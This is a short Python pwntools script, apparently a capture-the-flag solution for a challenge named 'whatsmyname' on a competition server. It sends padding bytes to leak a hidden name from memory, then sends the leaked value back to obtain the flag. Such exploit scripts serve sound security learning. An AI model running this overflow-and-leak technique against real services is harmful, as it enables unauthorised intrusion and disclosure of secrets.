import pwn

#prog = pwn.process('whatsmyname')
prog = pwn.remote('challs.actf.co', 31223)
prog.recvuntil(b'?')
prog.send(b'A'*47+b'\x04')
line = prog.recvuntil(b'flag!')
line = line[line.find(b'AAAA'):]
print(f"{line=}")
name = line[48:95]
print(f"{name=}, {len(name)}")
prog.send(name+b'\n')
print(prog.recvall())
#prog.interactive()
